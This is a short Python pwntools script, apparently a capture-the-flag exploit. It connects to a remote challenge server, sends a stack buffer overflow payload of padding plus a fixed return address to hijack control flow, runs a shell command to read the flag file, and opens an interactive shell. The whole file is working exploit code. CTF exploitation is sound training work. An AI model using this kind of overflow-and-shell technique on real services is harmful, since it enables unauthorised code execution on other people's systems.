#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

host , port = 'ctf.yuawn.idv.tw' , 10100
y = remote( host , port )

p = flat(
    'D' * 0x28,
    0x4005ba
)

y.sendline( p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()